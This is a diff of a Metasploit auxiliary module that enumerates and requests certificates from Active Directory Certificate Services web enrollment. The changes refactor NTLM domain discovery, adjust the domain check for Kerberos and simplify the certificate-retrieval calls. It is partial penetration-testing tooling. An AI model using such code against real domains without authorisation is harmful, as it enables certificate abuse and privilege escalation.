@@ -39,6 +39,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def validate
     super
+
     case datastore['MODE']
     when 'SPECIFIC_TEMPLATE'
       if datastore['CERT_TEMPLATE'].blank?
@@ -53,13 +54,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def pull_domain(target_ip, target_uri)
-    temp_username = datastore['HttpUsername']
-    temp_password = datastore['HttpPassword']
     begin
       vprint_status("Checking #{target_ip} URL #{target_uri}")
-      # datastore and options must be nil to fail login so we get ntlm challenge
-      datastore['HttpUsername'] = nil
-      datastore['HttpPassword'] = nil
       res = send_request_cgi({
         'rhost' => target_ip,
         'encode' => true,
@@ -75,12 +71,7 @@ class MetasploitModule < Msf::Auxiliary
     rescue ::Timeout::Error, ::Errno::EPIPE
       vprint_error('Timeout error')
       return
-    ensure
-      datastore['HttpUsername'] = temp_username
-      datastore['HttpPassword'] = temp_password
     end
-    datastore['HttpUsername'] = temp_username
-    datastore['HttpPassword'] = temp_password
 
     return nil if res.nil?
 
@@ -114,23 +105,25 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(target_ip)
     validate
-    if datastore['HTTP::Auth'] == 'ntlm' || datastore['HTTP::Auth'] == 'auto'
-      queried_domain = pull_domain(target_ip, target_uri)
-      if queried_domain.nil?
-        fail_with(Failure::UnexpectedReply, 'Failed to automatically populate DOMAIN; please do so manually and retry')
-      end
 
-      # The queried_domain value is coming is as a UTF-16LE string encoded in ASCII 8-bit.
-      # We need to normalize it so we can do the string compares later
-      datastore_domain = datastore['DOMAIN']
-      queried_domain.force_encoding('UTF-16LE')
-      queried_domain = queried_domain.encode(datastore_domain.encoding)
-
-      if datastore['DOMAIN'] != 'WORKSTATION' && queried_domain != datastore_domain
-        fail_with(Failure::UnexpectedReply, "Server claims to be a member of #{queried_domain} domain and does not match the datastore domain entry #{datastore['DOMAIN']}")
-      end
-      connection_identity = queried_domain + '\\' + datastore['HttpUsername']
+    queried_domain = pull_domain(target_ip, target_uri)
+    if queried_domain.nil?
+      fail_with(Failure::UnexpectedReply, 'Failed to automatically populate DOMAIN; please do so manually and retry')
     end
+
+    # The queried_domain value is coming is as a UTF-16LE string encoded in ASCII 8-bit.
+    # We need to normalize it so we can do the string compares later
+    datastore_domain = datastore['DOMAIN']
+    queried_domain.force_encoding('UTF-16LE')
+    queried_domain = queried_domain.encode(datastore_domain.encoding)
+
+    # kerberos requires DOMAIN be the FQDN but in other cases check if DOMAIN is set to something other than the NETBIOS
+    # domain name that was returned from the NTLM handshake which would imply an operator error
+    if datastore['HTTP::Auth'] != 'kerberos' && datastore['DOMAIN'].present? && datastore['DOMAIN'] != 'WORKSTATION' && queried_domain != datastore_domain
+      fail_with(Failure::UnexpectedReply, "Server claims to be a member of #{queried_domain} domain and does not match the datastore domain entry #{datastore['DOMAIN']}")
+    end
+    connection_identity = queried_domain + '\\' + datastore['HttpUsername']
+
     http_client = connect(
       {
         'rhost' => target_ip,
@@ -148,12 +141,12 @@ class MetasploitModule < Msf::Auxiliary
         print_status('***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***')
         print_good("Available Certificates for #{connection_identity} on #{datastore['RHOST']}: #{cert_templates.join(', ')}")
         if datastore['MODE'] == 'ALL'
-          retrieve_certs(target_ip, http_client, connection_identity, cert_templates)
+          retrieve_certs(http_client, connection_identity, cert_templates)
         end
       end
     when 'SPECIFIC_TEMPLATE'
       cert_template = datastore['CERT_TEMPLATE']
-      retrieve_cert(target_ip, http_client, connection_identity, cert_template)
+      retrieve_cert(http_client, connection_identity, cert_template)
     end
   end
 
